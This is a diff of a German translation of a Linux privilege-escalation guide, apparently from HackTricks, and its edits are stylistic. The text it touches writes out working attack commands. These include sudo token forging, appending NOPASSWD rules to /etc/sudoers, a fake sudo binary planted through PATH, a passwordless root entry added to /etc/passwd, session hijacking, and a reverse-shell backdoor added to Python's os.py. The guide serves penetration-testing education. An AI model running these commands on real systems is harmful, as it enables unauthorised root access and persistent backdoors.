-Wenn Sie **Schreibberechtigungen** im Ordner oder auf eine der darin erstellten Dateien haben, können Sie die Binärdatei [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und PID zu erstellen**.\
-Wenn Sie beispielsweise die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und Sie eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **sudo-Rechte erhalten**, ohne das Passwort wissen zu müssen, indem Sie:
+Wenn Sie **Schreibberechtigungen** im Ordner oder auf einer der darin erstellten Dateien haben, können Sie die Binärdatei [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und PID zu erstellen**.\
+Zum Beispiel, wenn Sie die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und Sie eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **sudo-Rechte erhalten**, ohne das Passwort wissen zu müssen, indem Sie:
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
 ### /etc/sudoers, /etc/sudoers.d
 
 Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur von Benutzer root und Gruppe root gelesen werden**.\
-**Wenn** Sie diese Datei **lesen** können, könnten Sie in der Lage sein, **einige interessante Informationen zu erhalten**, und wenn Sie **irgendeine Datei schreiben** können, werden Sie in der Lage sein, **Privilegien zu eskalieren**.
+**Wenn** Sie diese Datei **lesen** können, könnten Sie in der Lage sein, **interessante Informationen zu erhalten**, und wenn Sie eine Datei **schreiben** können, werden Sie in der Lage sein, **Privilegien zu eskalieren**.
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
-Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
+Wenn Sie schreiben können, können Sie diese Berechtigung missbrauchen.
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
@@ -979,11 +979,11 @@ permit nopass demo as root cmd vim
 ```
 ### Sudo Hijacking
 
-Wenn Sie wissen, dass ein **Benutzer normalerweise eine Maschine verbindet und `sudo`** verwendet, um Privilegien zu eskalieren, und Sie haben eine Shell im Benutzerkontext erhalten, können Sie **eine neue sudo ausführbare Datei erstellen**, die Ihren Code als root und dann den Befehl des Benutzers ausführt. Dann **ändern Sie den $PATH** des Benutzerkontexts (zum Beispiel, indem Sie den neuen Pfad in .bash_profile hinzufügen), sodass, wenn der Benutzer sudo ausführt, Ihre sudo ausführbare Datei ausgeführt wird.
+Wenn Sie wissen, dass ein **Benutzer normalerweise eine Verbindung zu einer Maschine herstellt und `sudo`** verwendet, um Berechtigungen zu eskalieren, und Sie eine Shell im Kontext dieses Benutzers erhalten haben, können Sie **eine neue sudo ausführbare Datei erstellen**, die Ihren Code als root und dann den Befehl des Benutzers ausführt. Dann **ändern Sie den $PATH** des Benutzerkontexts (zum Beispiel, indem Sie den neuen Pfad in .bash_profile hinzufügen), sodass, wenn der Benutzer sudo ausführt, Ihre sudo ausführbare Datei ausgeführt wird.
 
-Beachten Sie, dass Sie, wenn der Benutzer eine andere Shell verwendet (nicht bash), andere Dateien ändern müssen, um den neuen Pfad hinzuzufügen. Zum Beispiel [sudo-piggyback](https://github.com/APTy/sudo-piggyback) ändert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Sie können ein weiteres Beispiel in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) finden.
+Beachten Sie, dass Sie, wenn der Benutzer eine andere Shell (nicht bash) verwendet, andere Dateien ändern müssen, um den neuen Pfad hinzuzufügen. Zum Beispiel [sudo-piggyback](https://github.com/APTy/sudo-piggyback) ändert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Sie finden ein weiteres Beispiel in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
 
-Oder etwas wie ausführen:
+Oder etwas wie:
 ```bash
 cat >/tmp/sudo <<EOF
 #!/bin/bash
@@ -1002,7 +1002,7 @@ sudo ls
 
 ### ld.so
 
-Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`
+Die Datei `/etc/ld.so.conf` gibt **an, woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`
 
 Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen **Bibliotheken** **gesucht** werden. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken im Verzeichnis `/usr/local/lib` suchen wird**.
 
@@ -1048,7 +1048,7 @@ execve(file,argv,0);
 ```
 ## Fähigkeiten
 
-Linux-Fähigkeiten bieten eine **Teilmenge der verfügbaren Root-Rechte für einen Prozess**. Dies zerlegt effektiv die Root-**Rechte in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann unabhängig Prozessen gewährt werden. Auf diese Weise wird die vollständige Menge an Rechten reduziert, was die Risiken einer Ausnutzung verringert.\
+Linux-Fähigkeiten bieten eine **Teilmenge der verfügbaren Root-Rechte für einen Prozess**. Dies zerlegt effektiv die Root-**Rechte in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann unabhängig an Prozesse vergeben werden. Auf diese Weise wird die vollständige Menge an Rechten reduziert, was die Risiken einer Ausnutzung verringert.\
 Lesen Sie die folgende Seite, um **mehr über Fähigkeiten und deren Missbrauch zu erfahren**:
 
 {{#ref}}
@@ -1058,11 +1058,11 @@ linux-capabilities.md
 ## Verzeichnisberechtigungen
 
 In einem Verzeichnis impliziert das **Bit für "ausführen"**, dass der betroffene Benutzer in den Ordner "**cd**" wechseln kann.\
-Das **"lesen"**-Bit impliziert, dass der Benutzer die **Dateien** auflisten kann, und das **"schreiben"**-Bit impliziert, dass der Benutzer **löschen** und **neue Dateien** **erstellen** kann.
+Das **"lesen"**-Bit impliziert, dass der Benutzer die **Dateien** **auflisten** kann, und das **"schreiben"**-Bit impliziert, dass der Benutzer **löschen** und **neue Dateien** **erstellen** kann.
 
 ## ACLs
 
-Access Control Lists (ACLs) stellen die sekundäre Schicht der diskretionären Berechtigungen dar, die in der Lage sind, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die nicht die Eigentümer oder Teil der Gruppe sind, Rechte gewähren oder verweigern. Diese Ebene der **Granularität sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details finden Sie [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).
+Access Control Lists (ACLs) stellen die sekundäre Schicht der diskretionären Berechtigungen dar, die in der Lage sind, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die nicht die Eigentümer oder Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details finden Sie [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).
 
 **Geben** Sie dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
 ```bash
@@ -1077,12 +1077,12 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
 ## Offene Shell-Sitzungen
 
-In **alten Versionen** können Sie einige **Shell**-Sitzungen eines anderen Benutzers (**root**) **übernehmen**.\
-In **neueren Versionen** können Sie nur zu Bildschirm-Sitzungen Ihres **eigenen Benutzers** **verbinden**. Sie könnten jedoch **interessante Informationen innerhalb der Sitzung** finden.
+In **alten Versionen** können Sie **Shell**-Sitzungen eines anderen Benutzers (**root**) **übernehmen**.\
+In **neueren Versionen** können Sie nur zu Screen-Sitzungen Ihres **eigenen Benutzers** **verbinden**. Sie könnten jedoch **interessante Informationen innerhalb der Sitzung** finden.
 
-### Bildschirm-Sitzungen übernehmen
+### Screen-Sitzungen übernehmen
 
-**Liste der Bildschirm-Sitzungen**
+**Liste der Screen-Sitzungen**
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
@@ -1117,20 +1117,20 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 # If you are root or devs you can access it
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
-Überprüfen Sie die **Valentine-Box von HTB** für ein Beispiel.
+Check **Valentine box from HTB** for an example.
 
 ## SSH
 
-### Debian OpenSSL Vorhersehbarer PRNG - CVE-2008-0166
+### Debian OpenSSL Predictable PRNG - CVE-2008-0166
 
-Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu usw.) zwischen September 2006 und dem 13. Mai 2008 generiert wurden, können von diesem Fehler betroffen sein.\
+Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu usw.) zwischen September 2006 und dem 13. Mai 2008 generiert wurden, könnten von diesem Fehler betroffen sein.\
 Dieser Fehler tritt auf, wenn ein neuer SSH-Schlüssel in diesen Betriebssystemen erstellt wird, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn Sie den SSH-Öffentlichen Schlüssel haben, können Sie nach dem entsprechenden privaten Schlüssel suchen**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
 ### SSH Interessante Konfigurationswerte
 
 - **PasswordAuthentication:** Gibt an, ob die Passwortauthentifizierung erlaubt ist. Der Standardwert ist `no`.
 - **PubkeyAuthentication:** Gibt an, ob die Authentifizierung mit öffentlichem Schlüssel erlaubt ist. Der Standardwert ist `yes`.
-- **PermitEmptyPasswords**: Wenn die Passwortauthentifizierung erlaubt ist, gibt es an, ob der Server die Anmeldung bei Konten mit leeren Passwortzeichenfolgen erlaubt. Der Standardwert ist `no`.
+- **PermitEmptyPasswords**: Wenn die Passwortauthentifizierung erlaubt ist, gibt an, ob der Server die Anmeldung bei Konten mit leeren Passwortzeichenfolgen erlaubt. Der Standardwert ist `no`.
 
 ### PermitRootLogin
 
@@ -1138,12 +1138,12 @@ Gibt an, ob root sich über SSH anmelden kann, der Standardwert ist `no`. Mögli
 
 - `yes`: root kann sich mit Passwort und privatem Schlüssel anmelden
 - `without-password` oder `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
-- `forced-commands-only`: Root kann sich nur mit privatem Schlüssel anmelden, wenn die Befehlsoptionen angegeben sind
+- `forced-commands-only`: Root kann sich nur mit privatem Schlüssel anmelden und wenn die Befehlsoptionen angegeben sind
 - `no` : nein
 
 ### AuthorizedKeysFile
 
-Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die für die Benutzerauthentifizierung verwendet werden können. Es kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers** angeben. Zum Beispiel:
+Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die für die Benutzerauthentifizierung verwendet werden können. Es kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers**. Zum Beispiel:
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
@@ -1158,12 +1158,12 @@ Sie müssen diese Option in `$HOME/.ssh.config` wie folgt festlegen:
 Host example.com
 ForwardAgent yes
 ```
-Beachten Sie, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host Zugriff auf die Schlüssel haben wird (was ein Sicherheitsproblem darstellt).
+Beachten Sie, dass wenn `Host` `*` ist, der Benutzer jedes Mal, wenn er zu einer anderen Maschine wechselt, auf die Schlüssel zugreifen kann (was ein Sicherheitsproblem darstellt).
 
-Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
-Die Datei `/etc/sshd_config` kann das Weiterleiten des ssh-agents mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist erlauben).
+Die Datei `/etc/ssh_config` kann **diese Optionen überschreiben** und diese Konfiguration erlauben oder verweigern.\
+Die Datei `/etc/sshd_config` kann das ssh-agent-Forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist erlauben).
 
-Wenn Sie feststellen, dass der Forward Agent in einer Umgebung konfiguriert ist, lesen Sie die folgende Seite, da **Sie möglicherweise in der Lage sind, dies auszunutzen, um Privilegien zu eskalieren**:
+Wenn Sie feststellen, dass das Forward Agent in einer Umgebung konfiguriert ist, lesen Sie die folgende Seite, da **Sie möglicherweise in der Lage sind, es auszunutzen, um Privilegien zu eskalieren**:
 
 {{#ref}}
 ssh-forward-agent-exploitation.md
@@ -1177,7 +1177,7 @@ Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte,
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-Wenn ein seltsames Profil-Skript gefunden wird, sollten Sie es auf **sensible Details** überprüfen.
+Wenn ein seltsames Profilskript gefunden wird, sollten Sie es auf **sensible Details** überprüfen.
 
 ### Passwd/Shadow-Dateien
 
@@ -1214,7 +1214,7 @@ WARNUNG: Sie könnten die aktuelle Sicherheit der Maschine beeinträchtigen.
 echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
-HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` in `/etc/pwd.db` und `/etc/master.passwd`, außerdem wird `/etc/shadow` in `/etc/spwd.db` umbenannt.
+HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wird `/etc/shadow` in `/etc/spwd.db` umbenannt.
 
 Sie sollten überprüfen, ob Sie **in einige sensible Dateien schreiben können**. Zum Beispiel, können Sie in eine **Dienstkonfigurationsdatei** schreiben?
 ```bash
@@ -1235,7 +1235,7 @@ Die folgenden Ordner können Backups oder interessante Informationen enthalten: 
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Seltsame Orte/Besitzene Dateien
+### Seltsame Orte/Besitzdateien
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1287,7 +1287,7 @@ find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/gam
 ### Bekannte Dateien mit Passwörtern
 
 Lesen Sie den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
-**Ein weiteres interessantes Tool**, das Sie dafür verwenden können, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), das eine Open-Source-Anwendung ist, um viele Passwörter abzurufen, die auf einem lokalen Computer für Windows, Linux und Mac gespeichert sind.
+**Ein weiteres interessantes Tool**, das Sie dafür verwenden können, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, die verwendet wird, um viele Passwörter abzurufen, die auf einem lokalen Computer für Windows, Linux und Mac gespeichert sind.
 
 ### Protokolle
 
@@ -1319,7 +1319,7 @@ Ich werde hier nicht auflisten, wie man all dies macht, aber wenn Sie interessie
 
 ### Python library hijacking
 
-Wenn Sie wissen, **woher** ein Python-Skript ausgeführt wird und Sie **in diesen Ordner schreiben können** oder **Python-Bibliotheken modifizieren können**, können Sie die OS-Bibliothek modifizieren und einen Backdoor einfügen (wenn Sie schreiben können, wo das Python-Skript ausgeführt wird, kopieren und fügen Sie die os.py-Bibliothek ein).
+Wenn Sie wissen, **woher** ein Python-Skript ausgeführt wird und Sie **in diesen Ordner schreiben können** oder **Python-Bibliotheken modifizieren können**, können Sie die OS-Bibliothek modifizieren und einen Backdoor einfügen (wenn Sie dort schreiben können, wo das Python-Skript ausgeführt wird, kopieren und fügen Sie die os.py-Bibliothek ein).
 
 Um **die Bibliothek zu backdooren**, fügen Sie einfach am Ende der os.py-Bibliothek die folgende Zeile hinzu (ändern Sie IP und PORT):
 ```python
@@ -1336,7 +1336,7 @@ Detailliertere Informationen über die Schwachstelle finden Sie auf dieser Seite
 
 Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.
 
-Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-Logs),** also überprüfen Sie immer, ob Sie Protokolle ändern können, wer diese Protokolle verwaltet und ob Sie die Berechtigungen erhöhen können, indem Sie die Protokolle durch Symlinks ersetzen.
+Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-Protokolle),** also überprüfen Sie immer, ob Sie Protokolle ändern können, wer diese Protokolle verwaltet und ob Sie die Berechtigungen erhöhen können, indem Sie die Protokolle durch Symlinks ersetzen.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
@@ -1358,9 +1358,9 @@ DEVICE=eth0
 
 Das Verzeichnis `/etc/init.d` ist die Heimat von **Skripten** für System V init (SysVinit), dem **klassischen Linux-Dienstverwaltungssystem**. Es enthält Skripte zum `starten`, `stoppen`, `neustarten` und manchmal `neu laden` von Diensten. Diese können direkt oder über symbolische Links in `/etc/rc?.d/` ausgeführt werden. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.
 
-Andererseits ist `/etc/init` mit **Upstart** verbunden, einer neueren **Dienstverwaltung**, die von Ubuntu eingeführt wurde und Konfigurationsdateien für Dienstverwaltungsaufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen aufgrund einer Kompatibilitätsschicht in Upstart verwendet.
+Andererseits ist `/etc/init` mit **Upstart** verbunden, einer neueren **Dienstverwaltung**, die von Ubuntu eingeführt wurde und Konfigurationsdateien für Aufgaben der Dienstverwaltung verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen aufgrund einer Kompatibilitätsschicht in Upstart verwendet.
 
-**systemd** tritt als modernes Initialisierungs- und Dienstverwaltungssystem auf und bietet fortschrittliche Funktionen wie das Starten von Daemons nach Bedarf, Automount-Verwaltung und Systemzustands-Snapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Verteilungspakete und `/etc/systemd/system/` für Administratoränderungen, was den Systemverwaltungsprozess optimiert.
+**systemd** tritt als moderner Initialisierungs- und Dienstmanager auf und bietet fortschrittliche Funktionen wie das Starten von Daemons nach Bedarf, Automount-Management und Systemzustands-Snapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Verteilungspakete und `/etc/systemd/system/` für Administratoränderungen, was den Prozess der Systemadministration optimiert.
 
 ## Weitere Tricks
 
